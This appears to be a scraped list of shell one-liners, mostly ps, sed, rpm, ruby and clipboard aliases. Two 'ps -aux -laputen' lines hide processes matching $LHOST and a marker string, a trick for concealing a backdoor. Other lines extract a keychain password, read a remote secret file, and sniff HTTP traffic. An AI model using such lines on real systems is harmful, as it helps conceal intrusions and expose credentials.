"setconf PKGBUILD $(makepkg -g 2>/dev/null | pee ""head -1 | cut -d= -f1"" ""cut -d= -f2"") "")"""
"set | grep SSH | sed ""s/^/export /"" > ~/ssh_env;chmod 600 ~/ssh_env"
"set | grep ""=()"" | cut -f1 -d="
"selectr mu cfind ""%"" \| head -n 40 | sed ""s/\([^ ]*\)$/<\1>/g"""
"sed -ne ""/generated by/,/end/p"" testcode.html | head -n -4 | grep -v generated > mainmem_16.vmem"
"sed -n '/FREQ(CM\*\*-1)/,/^$/{//!p;}' | awk '{print $2,$NF}' | gnuplot -e \"
"sed -i '' '13s/backtrace/backtrace.slice(0,3).map { |x| x.gsub(Rails.root.to_s,"
"sed -i ""s@^\(bt-tracker=\).*@\1$(curl -s -L https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_ip.txt | sed ""/^\s*$/d"" | tr ""\n"" "","")@"" ~/.aria2/aria2.conf"
"sed -e 's/^: [0-9]\{10\}:0;//' ~/.zshist | sed -e 's/sudo //' | \
"sed -e 's/,,/, ,/g' | column -s, -t | less -#5 -N -S"
"sed -e ""s/:/:0000/g"" -e ""s/:0*\([0-9a-f][0-9a-f][0-9a-f][0-9a-f]\)/:\1/g"" -e ""s/://g"" | rev | sed -e ""s/./&./g"" -e ""s/$/ip6.arpa/"""
"sed -E ""s/^(.+)/2015\-\1/"" |sed -E ""s/([0-9]{2})\.[0-9]{3}/\1/"" | sed -E ""s/(^.+[0-9]{2}:[0-9]{2}) .+/\1/"""
"sed 's/>/> /' | sort -k2,3 -S20G | sed 's/> />/'"
"sed 's/,\s\+/,/g' | sed 's/\s\+,/,/g' | sed 's/^\s\+//g'"
"sed '1,6 d' | sed '2,6 d' | sed '1,\$s/ //g'"
"sed '1 s/^(\xef\xbb\xbf|\xfe\xff)//' | perl -MJSON::XS -MData::Dumper -ne 'use utf8; print Dumper( JSON::XS::decode_json( \$_ ) ), \$/;' "
"sed ""s:/home/zeltak/music/::"" | sed ""s/ /\ /g"" | mpc add"
"sed ""s/^#//"" /etc/pacman.d/mirrorlist.pacnew | rankmirrors -n 10 - | sudo tee /etc/pacman.d/mirrorlist"
"sed ""s/\(.\)/\1\n/g"" | grep -o "".\+"" | wc -l"
"sed ""/^\s*$/d"" | wc -l | xargs"
"security find-generic-password -a ""$1"" -g 2>&1 | grep password | sed -e ""s/password: \""//"" -e ""s/\""//"""
"secret=`ssh tb-driver ""cat /etc/plharness/secret""`; echo -e ""${secret}\n"" | ssh tb-driver ""/opt/libvirt/bin/virsh -c esx://root@soko/?no_verify=1 list"" | sed ""1,2d"""
"screen -x `screen -ls | grep ""\.scr"" | sed ""s/\..*//""`"
"screen -x ""cmus"" || screen -S ""cmus"" -m ""cmus"""
"scanimage -d plustek:libusb:$(lsusb | grep -i scan | sed ""s/Bus.\([0-9]*\).Device.\([0-9]*\).*/\1:\2/"") -x 90 -y 55 --format=jpg --resolution=300"
"scanimage -d plustek:libusb:$(lsusb | grep -i scan | sed ""s/Bus.\([0-9]*\).Device.\([0-9]*\).*/\1:\2/"") -x 215 -y 297 --format=jpg --resolution=300"
"scanimage -d plustek:libusb:$(lsusb | grep -i scan | sed ""s/Bus.\([0-9]*\).Device.\([0-9]*\).*/\1:\2/"") -x 215 -y 149 --format=jpg --resolution=300"
"sacctmgr -p list qos $@ format=Name,Priority,GraceTime,GrpTRES,GrpJobs,GrpSubmit,GrpSubmit,MaxTRES,MaxTRESPerUser,MaxJobsPU | column -ts""|"""
"s2c;grep ""s2 "" ~/.bash_history* -h | sort | uniq > ~/.bash_history_s2; php `pwd`/app/console"
"rvm use `grep ruby= .versions.conf | sed ""s/^.*=//""`@`grep ruby-gemset .versions.conf | sed ""s/^.*=//""`"
"ruby -pi.bak -e ""BEGIN{\$num=0}; gsub(/(playOrder=.)\d*/) {|s| \$num+=1; \$1+\$num.to_s}"" *.ncx"
"ruby -pe ""gsub(/;/, \"":\"")"" | ruby -pe ""gsub(/\\\\/, \""/\"")"" | xargs cygpath -p"
"ruby -p -e '%w(rubygems active_support).each{|l| require l}' \
"ruby -ne ""puts \$_.gsub(/%([0-9A-Fa-f][0-9A-Fa-f])/) { |m| \$1.hex.chr; }"""
"ruby -e 'puts Array.new((ARGV[0] || 16).to_i){ rand(63) }.pack(%q!C*!).tr(%Q!\x00-\x3f!, %q!A-Za-z0-9_!)'"
"ruby -e 'Range.new((ARGV[0].to_i), (ARGV[1].to_i)).each { |i| puts i }'"
"ruby -e 'C=`stty size`.scan(/\d+/)[1].to_i;S=[""2743"".to_i(16)].pack(""U*"");a={};puts ""\033[2J"";loop{a[rand(C)]=0;a.each{|x,o|;a[x]+=1;print ""\033[#{o};#{x}H \033[#{a[x]};#{x}H#{S} \033[0;0H""};$stdout.flush;sleep 0.1}'"
"ruby -e ""puts \$stdin.read.split(\""\n\"").map{|l| \""\\\""#{l}\\\""\""}"" "
"ruby -e ""a=[]; sep=ARGV.shift||\"" \""; while(gets); a<<\$_.chomp;end; puts a.join(sep)"""
"ruby -e ""a = ARGV.shift; b = ARGV.shift; ARGV.each{ |f| File.rename(f, f.gsub(a, b)) }"""
"ruby -e ""ARGV.each{|x|puts x}"""
"ruby -e ""%w(open-uri rubygems json).each{|l|require l};puts JSON.pretty_generate(JSON.parse(open(ARGV[0]).read))"""
"rubocop $( git diff --name-only --diff-filter=AMRC | grep -e "".*\.rb"" | paste -s - )"
"rubocop $( git diff --cached --name-only --diff-filter=AMRC | grep -e "".*\.rb"" | paste -s - )"
"rspec `find spec -name ""*spec.rb"" | $(brew --prefix coreutils)/bin/gsort -R | head -n 42`"
"rpm -qa --qf ""%{size}\t%{name}\n"" | sort -nr | $PAGER"
"rpm -qa --qf ""%{name} %{buildhost}\n"" | grep ""\.vtf"" | awk ""{print \$1}"""
"rpm -qa --qf ""%-15{SIZE}%{NVRA}\n"" | sort -nr | head"
"rpm -q --qf ""%{N}-%|E?{%{E}:}|%{V}-%{R}.%{ARCH}\n"""
"rpm -e $(rpm -qa | grep -E ""^kernel"" | grep -v $(uname -r))"
"rpm --qf ""%{SIZE}\t%{NAME}\n"" -qa | sort -nr | less"
"row=$(awls-vpc); name=$(echo ${row} | cut -f 2); host=$(echo ${row} | cut -f 3); echo ""...ssh ${name} (${host})""; ssh ${host}"
"row=$(awls); name=$(echo ${row} | cut -f 2); host=$(echo ${row} | cut -f 4); echo ""...ssh ${name} (${host})""; ssh ${host}"
"row=$(awls); name=$(echo ${row} | cut -f 2); host=$(echo ${row} | cut -f 3); echo ""...ssh ${name} (${host})""; ssh ${host}"
"route -n | grep UG | awk ""{print \\\$2}"""
"root tcpdump -i en0 -n -s 0 -w - | grep -a -o -E \""Host\: .*|GET \/.*\"""
"rmi(){ docker rmi $(docker images | grep $1 | awk ""{print $3}"");};rmi"
"rm .tmux_restore_sessions; tmux list-sessions | cut -d "":"" -f 1 | xargs -I {[]} echo ""new-session -s {[]}"" >> .tmux_restore_sessions; echo ""source-file ~/.tmux.conf"" >> .tmux_restore_sessions"
"rm -rf `git status --porcelain | sed -e -e""s/\?\? / /"" | tr -d "
"rm -f ~/.nginx/sites-enabled/default.conf; cat ~/.nginx/sites-enabled/conf.template | sed -e ""s/TEMPLATE_PATH/${PWD//\//\\/}/""| sed -e ""s/HOME/${HOME//\//\\/}/"" > ~/.nginx/sites-enabled/default.conf; nginx_stop; nginx_start"
"rm -f TAGS && find apps deps -type f -iname ""*.[eh]rl"" -o -iname ""*.[ch]"" -o -iname ""*.js"" -o -iname ""*.hbs"" | grep -v -e ""vendor"" -e ""node_modules"" -e ""example"" | xargs ctags -a -e"
"rm $(svn st | grep ""^?"" | sed -r ""s/^\? +//"")"
"rid -GLId | egrep -v ""=|r"""
"rg -v ""^--|^ *$"" **/*.hs | wc -l"
"rg -e "":[a-z]*:"" -o -N --no-filename $HOME/homewiki/log | sort | uniq -c"
"rg --no-line-number ^bindsym\ $HOME/.config/i3/config | awk ""{$1=""""; print $0}"" | fzf"
"rg ""^(<<<<<<<|>>>>>>>|=======)[^<>=]"""
"rg ""TODO|NOTE|FIXME"""
"rg ""<<<<<<<"" || (git add -u && git rebase --continue)"
"rg ""(TODO|FIXME|\bXXX\b)"""
"rg ""((error|warning)\[\w+\])|(^\s+--> \w+/\w+)"" -N --color never"
"rev | tac | trrr ""{upright}{flip}"" ""{flip}{upright}"""
"return 0; }; bl_exception_try_wrapper ""$@""; bl.exception.exit_try $? || "
"res=$(sudo lsof -Pan -i tcp -i udp) && echo ${res} | head -n1 && echo ${res} | grep -i ""listen"""
"recordmydesktop --v_bitrate 5000000 --full-shots --fps 10 --no-sound --windowid $(xwininfo | grep ""Window id:"" | sed -e ""s/xwininfo\:\ Window id:\ // ;s/\ .*//"")"
"recordmydesktop --no-cursor --windowid $(xwininfo -display :0 | grep ""id: 0x"" | grep -Eo ""0x[a-z0-9]+"")"
"record_dirname=record_$(date | sed -e ""s: :_:g"" -e ""s,:,-,g"") && mkdir $record_dirname && cd $record_dirname && arecord -f dat -t raw | oggenc -r -o ${record_dirname}_ogg -"
"reattach-to-user-namespace osascript -e ""display notification \""$(history|tail -n1|sed -e "
"read -s -p ""Input your master password: "" MASTER && printf ""\n"" && read -p ""For which website: "" WEBSITE && printf ""\n"" && shasum -a 256 - <<< ""$MASTER""\#""$WEBSITE"" | cut -c 10-20 | pbcopy"
"read -p ""Encrypted password: ""; echo -n ""Decrypted password: ""; echo $REPLY | openssl enc -d -base64 | openssl rsautl -decrypt -inkey rsa-priv.key;"
"read -p ""Are you sure(y/N)? "" -n 1 -r && [[ ""${REPLY}"" =~ ^[Yy]$ ]] || (echo ""cancelled"";exit 1)"
"rc=`git stash` && if [ `git remote show | wc -l | sed ""s/ //g""` == ""1"" ]; then rem=`git remote show`; else rem=""origin""; fi; git fetch $rem && git rebase $rem/master && if [ ""$rc"" != ""No local changes to save"" ]; then git stash pop; fi;"
"ras tree -d -I ""pwscf.save|zpe|pp"""
"rake `rake -T | selecta | awk ""{ print $2 }""`"
"qwerty123qwerty=$(pwd);cd ~/hdd/Personal/2019/;mkdir -p ""$(date +%B)""; cd ""$(date +%B)"" ; DATE=`date +%y-%m-%d` ;filename=""$DATE.md""; test -f $filename || touch $filename; haroopad $filename;cd ""$qwerty123qwerty"""
"qstat | grep ""jmerkin"" | wc -l"
"qstat | grep "" qw""| awk "
"qstat -r | grep Full | cut -d "" "" -f 14"
"qstat -a | grep -G serial | wc -l"""
"qstat -a | grep -G perallel | wc -l"""
"qq| grep "" qw""| wc -l"
"qdel \$(q | grep yamamori | gawk 'BEGIN{FS=""."";i=0}{print '$1';++i}')"""
"q | grep -G yamamori | wc -l"""
"q | grep -G yamamori | gawk 'BEGIN{i=0}{i=i+\$9}END{print i}'"""
"q | grep -G @ajisai | wc -l"""
"python -c 'import sys; print sys.path' | tr ',' '\n' | grep -v 'egg'"
"python -c ""import uuid;print(uuid.uuid4())"" | tee | pbcopy"
"python -c ""import uuid;print str(uuid.uuid4()).lower()"" | tee /dev/tty | pbcopy"
"python -c ""import sys; print(sys.path)"" | tr "","" ""\n"" | grep -v ""egg"""
"python -c ""import sys; print sys.path"" | tr "","" ""\n"" | grep -v ""egg"""
"python -c ""import getpass; print(getpass.getpass())"" | iconv -t utf16le | openssl md4"
"pwgen 16 1 | tr -d ""\n"" | clip"
"pwgen -s -y 32 1 | tr -d ""\n"" | xclip -sel clip && echo ""New password copied to clipboard."""
"pwgen -cnyB 16 1 -r $PWGEN_SPECIAL | tr -d ""\n"" | pbcopy; echo -n ""Password copied to clipboard: ""; pbpaste; echo"
"pwd|tr -d ""\n""|xsel --clipboard --input"
"pwd|tr -d ""\n""|xclip"
"pwd|tr -d ""\n""|xclip -selection clipboard"
"pwd|tr -d ""\n""|xclip -sel s"
"pwd|tr -d ""\n""|xclip -sel p"
"pwd|tr -d ""\n""|pbcopy; echo copied current directory"
"pwd|tr -d ""\n""|pbcopy"
"pwd|tr -d ""\n""|pbcopy && pwd"
"pwd|tr -d ""\n""|clipcopy"
"pwd|tr -d ""\n""|c"
"pwd|tr -d ""\n"" | pbcopy"
"pwd | tr \""\n\"" \"" \"" | xsel -bi"
"pwd | tr -d \""\n\"" | xclip"
"pwd | tr -d ""\r\n"" | xerox"
"pwd | tr -d ""\r\n"" | xclip -selection clipboard"
"pwd | tr -d ""\r\n"" | xclip -sel clip"
"pwd | tr -d ""\r\n"" | pbcopy"
"pwd | tr -d ""\r\n"" | pbcopy && pwd"
"pwd | tr -d ""\r\n"" | clip"
"pwd | tr -d ""\r\n"" | _copy_and_print"
"pwd | tr -d ""\n"" |xclip -selection c && pwd "
"pwd | tr -d ""\n"" | xsel -ib"
"pwd | tr -d ""\n"" | xsel -b"
"pwd | tr -d ""\n"" | xel -pi"
"pwd | tr -d ""\n"" | xclip"
"pwd | tr -d ""\n"" | xclip -selection clipboard"
"pwd | tr -d ""\n"" | xclip -i"
"pwd | tr -d ""\n"" | pbcopy; echo ""Copied: $(pwd)"""
"pwd | tr -d ""\n"" | pbcopy; echo ""Copied `pwd`"""
"pwd | tr -d ""\n"" | pbcopy"
"pwd | tr -d ""\n"" | pbcopy && pwd"
"pwd | tr -d ""\n"" | pbcopy "
"pwd | tr -d ""\n"" | clipcopy"
"pwd | tr ""\n"" ""/"" | pbcopy"
"pwd | tr ""\n"" "" "" | xsel -i -b"
"pwd | tr ""\n"" "" "" | xsel -bi"
"pwd | tr ""\n"" "" "" | xclip -i -sel clip"
"pushd /vagrant/; git diff --name-only master | grep "".py"" | xargs pep8; popd"
"pushd +$( dirs -v | ""$FuzzyFinder"" | grep -o ""[[:digit:]]"") > /dev/null"
"pushd ${APPLECORE}; git branch --merged | grep -v ""\*"" | grep -v ""release/*"""
"ps|grep -v grep|grep -i -e "" PID "" -e VSZ -e"
"pstree -p | sed ""s/[0-9]//g"" | uniq"
"psm | grep -v "".* \${$} . .. grep.*"" | grep "
"psf ssh|grep -v ssh-agent|grep -- ""-L\ 4443"""
"psbook | psnup -2 | pstops '2:0,1U(21cm,29.7cm)'"
"psa | grep -v ""^\${USER} . .. \${$} . .. grep.*"" | grep "
"psa | grep -E ""^USER|${LOGNAME}"""
"ps | awk '/node.exe/,NF=1' | xargs kill -9 -f"
"ps xau | grep -vE ""^(${USER}|root)"""
"ps x | grep -v grep | grep -v ""ps x"""
"ps wwaxr -o pid,stat,%cpu,time,command | head -10 | less"
"ps waux | grep -v ""grep"" | grep -i $1 "
"ps u -C ssh|egrep ""COMMAND|ousted"""
"ps h -eo pmem,pcpu,pid,comm,user,cputime | sort -nr | head"
"ps h -eo pmem,comm | sort -nr | head"
"ps h -eo pcpu,pmem,pid,comm,user,cputime | sort -nr | head"
"ps faux | grep -v grep | grep ""$@"""
"ps faux | grep -v ""grep faux"" | grep -i -e VSZ -e"
"ps axuf | grep -v grep | grep ""$@"" -i --color=auto"
"ps axu | grep --invert-match grep | grep ""$@"" --ignore-case --color=auto"
"ps axo pid,user,pcpu,command | grep -v ""grep"" | grep "
"ps axo pid,ppid,pgrp,tty,tpgid,sess,comm |awk '$2==1\' |awk '$1==$3\'"
"ps axo %mem,comm,pid,euser | sort -nr | head -n 10"
"ps axo %cpu,%mem,comm |sort -unr| head -n 9"
"ps axo ""user,pid,ppid,vsz,command"" |sort -rnk4|head "
"ps axo ""user,pid,ppid,%cpu,command"" |sort -rnk4|head "
"ps axj | head -1; ps axj | egrep --color=never ""[0-9] \[.*\]"""
"ps ax |busybox grep -v ""grep ""|busybox grep -i"
"ps ax | pgrep -f ""ssh -fNC suitecrm-prd-proxy01"" | while read i; do kill -15 $i; done"
"ps ax | grep ""ssh"" | grep -v grep"
"ps ax -o pid,rss,command | numfmt --header --from-unit=1024 --to=iec --field 2|grep -v grep"
"ps ax -o %mem=--MEM--,user=---USER---,pid=---PID--,cmd | grep -v root | sort -Vr"
"ps awxf -o pid,ni,pcpu,%mem,wchan,cmd | grep -v ""grep"" | grep -i "
"ps awux | egrep ""insolard|insgorund"""
"ps aux|sort -rk 3,4|head -n 20"
"ps aux|grep tomcat|awk -F"" "" ""{printf($2) }"" "
"ps auxw|sort -k 1,2|more"
"ps auxw|ack -v ""USER""|sort +9"
"ps auxww|sort -k 1,2|more"
"ps auxww|awk ""\$7 ~ /^p/ && \$7 !~ /-/ {print}""|sort +6"
"ps auxwwww|awk ""\$8 ~ /(D|STAT)/{print}"""
"ps auxwwww -L|awk ""\$10 ~ /(D|STAT)/{print}"""
"ps auxwww | grep -v ""grep"" | grep --color=auto"
"ps auxwww | grep ""ssh -C"" | grep -v grep"
"ps auxww --sort=lstart | sort -r -k3,4 | head -20"
"ps auxw |grep '[s]sh' | awk '{print \$1, \$2, \$9, \$11, \$13}'"
"ps auxw |grep '[s]sh -fNT' | awk '{print \$1, \$2, \$9, \$11, \$13}'"
"ps auxf | head -n 1 && ps auxf | grep -v ""0.[0-9] 0"""
"ps auxf | grep -v grep | grep -i -e ""PID %CPU %MEM"" -e"
"ps auxf | grep -v grep | grep ""$@"" -i --color=auto"
"ps aux |grep ""skynet""|grep -v ""grep"""
"ps aux |grep ""\${@}"" | grep -v grep"
"ps aux | sort -rk 4,4 | head -n 6"
"ps aux | sort -rk 4,4 | head -n 10"
"ps aux | sort -rk 3,3 | head -n 6"
"ps aux | sort -rk 3,3 | head -n 5"
"ps aux | sort -rk 3,3 | head -n 10"
"ps aux | sort -rk 3,3 | head -5"
"ps aux | sort -r -nk 3,3 | head -n 10"
"ps aux | sort -nrk 3,3 | head -n 5"
"ps aux | sort -k4,4n | tail -10"
"ps aux | sort -k3,3n | tail -10"
"ps aux | sort -k 4,4 | tail "
"ps aux | sort -k 3,3 | tail "
"ps aux | percol | awk ""{ print \$2 }"""
"ps aux | peco | awk ""{ print \$2 }"""
"ps aux | peco --query=""$1"" | pbcopy"
"ps aux | grep -v grep | grep -e ""^USER"" -e "
"ps aux | grep -v grep | grep -E ""^odroid """
"ps aux | grep -v grep | grep ""$@"" -i --color=auto"
"ps aux | grep -v -e ""grep"" -e ""bash"" | grep ""conky"""
"ps aux | grep -v ""grep"" | grep -i"
"ps aux | grep -v ""grep"" | egrep"
"ps aux | grep -v ""grep --color=auto"" | grep -e %CPU -e "
"ps aux | grep -v ""grep --color=auto"" | grep "
"ps aux | grep -v ""e4a8704f594b025627f40f9d5107ec90"" | grep"
"ps aux | grep -v "" grep "" | grep -i"
"ps aux | grep -v "" grep "" | grep $(basename $(pwd))"
"ps aux | grep $(echo $1 | sed ""s/^\(.\)/[\1]/g"")"
"ps aux | grep ""ssh"" | grep ""\-f"""
"ps aux | grep ""ssh -f -N"" | grep -v ""grep"""
"ps aux | grep ""pts/[0-9]\+ \+T"" | grep -v grep"
"ps aux | grep ""node dist"" | grep -v ""grep"""
"ps aux | grep ""/Applications.*.app/"" | sed -n "
"ps aux | awk ""{print $1; pring $8}"" | grep -v /usr/bin*"
"ps aux | awk ""/python manage\.py runserver/{print \$2;}"" | xargs kill -9"
"ps aux --sort=-pcpu | grep -v ""grep.\+-i -e USER.\+%CPU.*"" | grep -i -e ""USER.\+%CPU.*"" -e"
"ps auwwx | sort -rk 3,3 | head"
"ps auux | grep -v ""grep""| grep"
"ps alx | grep -v ""grep"" | grep"
"ps a --format pcpu,user,comm,etime --sort pcpu | sort -gr | head -n 25"
"ps -u wildfly -o thcount,args | grep [o]racle | awk "
"ps -u root -o thcount,args | grep [c]onnector | awk "
"ps -opid,stat,args |grep -vE ""[ ]\[.*\]|[ ]ps\ """
"ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 6 | tail -15"
"ps -o ppid,pid,euser,stat,%cpu,rss,args | head -n 1; ps -eH -o ppid,pid,euser,stat,%cpu,rss,args | grep gillens"
"ps -o ppid,pid,euser,stat,%cpu,rss,args | head -n 1; ps -eH -o ppid,pid,euser,stat,%cpu,rss,args | grep $USER"
"ps -o pid,user,cmd -C java | sed -e 's/\([0-9]\+ *[^ ]*\) *[^ ]* *\([^$]*\)/\1 \2/' -e 's/-c[^ ]* [^ ]* \|-[^ ]* //g'"
"ps -o args= $(xprop -id $(xprop -root -f _NET_ACTIVE_WINDOW 0x "" \$0\\n"" _NET_ACTIVE_WINDOW | awk ""{print \$2}"") -f _NET_WM_PID 0c "" \$0\\n"" _NET_WM_PID | awk ""{print \$2}"")"
"ps -fu ""$USER"" | egrep ""java"" | egrep -v grep"
"ps -ewwo user,pid,ppid,tty,cmd | grep -v grep.-E.-i | grep -E -i"
"ps -ewwo user,pid,ppid,pgid,nice,pri,vsize:7,rssize:7,tty:6,start,pcpu,pmem,time,cmd | grep -v grep.-E.-i | grep -E -i"
"ps -eo user,pid,args | sort | less"
"ps -eo user,pcpu,pid,command | sort -r -k2 | head -11"
"ps -eo user,pcpu,pid,cmd | sort -r -k2 | head -6"
"ps -eo start_time,pid,command --sort=start_time | grep -v grep | grep"
"ps -eo rss,pmem,pcpu,vsize,args | sort -k 1 -r -n | less"
"ps -eo rss,pid,user,command --sort -rss | tail -n +2 | head -n \$1"
"ps -eo pmem,pid,user,command |sort -nrk 1 | head -20"
"ps -eo pmem,pcpu,vsize,pid,cmd | sort -k 1 -nr | head -5"
"ps -eo pmem,pcpu,vsize,pid,cmd | sort -k 1 -nr | head -2"
"ps -eo pmem,pcpu,vsize,pid,cmd | sort -k 1 -nr | head -10"
"ps -eo pmem,pcpu,rss,vsize,args|sort -k 1 -r|more"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 2 | tail -10"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 2 -r | more"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 1 | tail -10"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 1 -r | more"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 1 -r | less"
"ps -eo pid,rss,comm --sort rss | tail -n 20 | ccze -A"
"ps -eo pid,pcpu,pmem,ni,user,comm --sort pid | grep --colour=never -E 'PID|alex'"
"ps -eo pid,pcpu,comm --sort pcpu | tail -n 20 | ccze -A"
"ps -eo pid,etime,cmd | grep -v grep | grep"
"ps -eo pid,command | grep -v grep | grep -i"
"ps -eo pcpu,user,pid,command | grep Code | grep ""^\s*[1-9]"""
"ps -eo pcpu,user,pid,cmd | sort -r | head -6"
"ps -eo pcpu,pmem,pid,user,args | sort -r -k1 | less"
"ps -eo pcpu,pmem,pid,user,args | sort -k 1 -r | head -10"
"ps -eo pcpu,pid,user,command |sort -nrk 1 | head -20"
"ps -eo pcpu,pid,user,args|sort -k1 -r -g|head -10"
"ps -eo pcpu,pid,user,args | sort -rk1 | head"
"ps -eo pcpu,pid,user,args | sort -n -r | head "
"ps -eo pcpu,pid,user,args | sort -k1 -r | head -10"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -6"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -5"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -4"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -20"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -16"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -15"
"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -10"
"ps -eo pcpu,pid,user,args --no-headers| sort -t. -nk1,2 -k4,4 -r |head -n 5"
"ps -eo pcpu,pid -o comm= | sort -k1 -n -r | head -12"
"ps -eo pcpu,pid -o comm= | sort -k1 -n -r | head -1"
"ps -eo pcpu,args --no-headers | sort -k 1 -r -n | head"
"ps -eo cmd,fname,pid,pcpu,time --sort=-pcpu | head -n 11 && echo && ps -eo cmd,fname,pid,pmem,rss --sort=-rss | head -n 9"
"ps -eo \""%u %c %p %z\"" | sort -k4nr | head"
"ps -eo \""%u %c %p %C\"" | sort -k4nr | head"
"ps -eo %mem,pid,user,args|sort -k1 -r -g|head -10"
"ps -eo %mem,pid,comm | sort -k 1 -nr | head -10"
"ps -eo %cpu,pid,comm | sort -nr | head -10"
"ps -eo %cpu,pid,comm | sort -k 1 -nr | head -10"
"ps -eo ""user,pid,ppid,state,vsz,rss,time,args"" |sort -rk5 | head "
"ps -eo ""user,pid,ppid,state,%cpu,time,args"" |sort -rk5 | head "
"ps -eo ""%C:%p:%z:%a""|sort -nr|head"
"ps -eo ""%C:%p:%z:%a""|sort -k3 -nr|head"
"ps -elf | grep -v grep| grep --color -e ""\\sPID\\s"" -i -e "
"ps -elf | grep -v grep| grep --color -e ""[[:space:]]PID[[:space:]]"" -i -e "
"ps -elf | grep ""[Z|z]end"""
"ps -elf | ggrep -v ggrep| ggrep --color -e ""[[:space:]]PID[[:space:]]"" -i -e "
"ps -ef|grep ""$(whoami)""| sort -n"
"ps -ef | grep java | grep """
"ps -ef | grep java | cut -f 4 -d "" """
"ps -ef | grep \!1 | awk -F"" "" "
"ps -ef | grep -v ""grep"" | grep $1"
"ps -ef | grep -v ""grep \-\-color=auto"" | grep "
"ps -ef | grep -v ""grep --color=auto"" | grep "
"ps -ef | grep 'postgres:.*con[[:digit:]]\{1,\}' | grep -v grep"
"ps -ef | grep ""^ *${USER?}"" | sort -n -k 3 -k 2"
"ps -ef | egrep ""$1|PID"""
"ps -edf | grep $USER | grep -v ""grep $USER"""
"ps -eL -o pid,%cpu,lwp|sort -nr -k2|awk '{printf(\"
"ps -e -orss=,pid=,args= | sort -b -k1,1n | pr -TW$COLUMNS"
"ps -e -orss=,args= | sort -b -k1,1n|pr -TW$COLUMNS"
"ps -e -orss=,args= | sort -b -k1,1n| head -10"
"ps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS"
"ps -e -orss=,args= | sort -b -k1,1n | head -10"
"ps -e -orss=, args= | sort -b -k1,1n| head -10"
"ps -e -o'pcpu,pmem,rsz,pid,comm,args'|sort -k1,2nr|head -n 50"
"ps -e -o rss=,args= | sort -b -k1,1n | tail -10"
"ps -e -o rss=,args= | sort -b -k1,1n | pr -TW$COLUMNS"
"ps -e -o pid,vsz,comm= | tail +2 | sort -n -k 2"
"ps -e -o pid,command | grep $(echo $1 | sed ""s/^\(.\)/[\1]/g"")"
"ps -e -o pcpu,cpu,nice,state,cputime,args|sort -k1 -nr | head -10"
"ps -e -o pcpu,cpu,nice,state,cputime,args | sort -rk1 | head"
"ps -e -o pcpu,cpu,nice,state,cputime,args | sort -k1 -nr | head -10"
"ps -e -o %mem,pid,ppid,user,cmd | sort -nr | head"
"ps -e -o %cpu,pid,ppid,user,cmd | sort -nr | head"
"ps -e -o ""user,pid,ppid,vsz,args""|sort -rnk4|head "
"ps -e -o ""user,pid,ppid,pcpu,args""|sort -rnk4|head "
"ps -e -o ""user pid ppid s pcpu nice vsz stime tty time args"" | sort | more"
"ps -e -o ""user pid ppid s pcpu nice vsz stime tty time args"" | grep monty | more"
"ps -axo pid,rsz,vsz,cmd,args | sort -n -k2 | tail -20"
"ps -ax | grep -v ""grep"" | grep -i "
"ps -ax -o user,pid,ppid,stime,tty,time,command | grep -vw grep | grep -i"
"ps -ax -o pid,pgid,ppid,command | grep -v grep | grep -i -e VSZ -e"
"ps -aux | grep -v ""grep"" | grep"
"ps -aux | grep -v ""grep --color"" | grep --color"
"ps -aux -laputen| grep -v $LHOST| grep -v ""chocolatine ;#"""
"ps -aux -laputen| grep --line-buffered -v $LHOST| grep --line-buffered -v ""chocolatine ;#"""
"ps -arcwwwxo ""pid command %cpu %mem"" | grep -v grep | head -13"
"ps -amcwwwxo ""pid ppid rss %mem %cpu command"" | grep -v grep | head -20"
"ps -amcwwwxo ""command %mem %cpu"" | grep -v grep | head -10"
"ps -a -x -f | grep -v grep | grep ""$@"""
"ps -a -o user,pid,pcpu,pmem,vsz,rss,time,comm | more | grep -v ""0.00"""
"ps -Av | grep "" Z "" | grep -v grep"
"ps -Ao pid:5,state:1,user,cmd | grep -v grep | egrep"
"ps -A | awk ""{ print \$4 }"" | awk -F""/"" ""{print \$NF}"""
"ps -A Tho pid,args | grep -v grep | egrep"
"ps -A -o user=$USER | sort -u | while read the_acct;\
"ps -A -o user,etime,pid,cmd | grep -v -w grep | grep -i"
"ps -A -o ""user,pid,ppid,vsz,args""|sort -rnk4|head "
"ps -A -o ""user,pid,ppid,pcpu,args""|sort -rnk4|head "
"ps -A --sort pcpu --format pcpu,comm |tail -n 3| sort -r"
"ps --no-header -eo pmem,size,vsize,comm | sort -nr | sed 10q"
"ps --no-header -eo pcpu,comm | sort -nr | sed 10q"
"ps $PS_HEADER | head -1; ps $PS_HEADER | egrep --color=never ""[0-9] \[.*\]"""
"pry -r `test -f config/environment.rb && echo ""./config/environment"" || echo ""./config/boot""`"
"processes=`ps aux`; echo ""$processes"" | head -n1; echo ""$processes"" |grep"
"processes=`ps aux`; echo ""$processes"" | head -n1; echo ""$processes"" |grep -E"
"prlctl exec ${uuid} ifconfig eth0 | egrep -o ""([[:xdigit:]]{0,4}[:]){7}[[:xdigit:]]{0,4}"" | sed -n 1p"
"prlctl exec ${uuid} ifconfig eth0 | egrep -o ""([0-9]{1,3}\.){3}[0-9]{1,3}"" | sed -n 1p"
"printf %s\\n ""$PATH"" | tr "":"" ""\n"" | sort"
"printf %s ""$(git branch | grep ""*"" | cut -f 2 -d "" "")"""
"printf ""|%s|\n"""
"printf ""\n>>> Removing feature/ branches\n\n"" && git branch | grep feature/ | xargs git branch -d {}"
"printf ""\e]1;irc\a""; autossh -t -M 0 khmer@aram.xkcd.com ""tmux attach -d -t irssi || tmux new -s irssi"""
"printf ""\$*"" | xxd -b | cut -d"" "" -f2"
"printf ""Generate /etc/hosts contents\n""; echo ""$(ip addr show dev $(ip r | grep -oP ""default.*dev \K\S*"") | grep -oP ""(?<=inet )[^/]*(?=/)"") $(hostname -f) $(hostname -s)"""
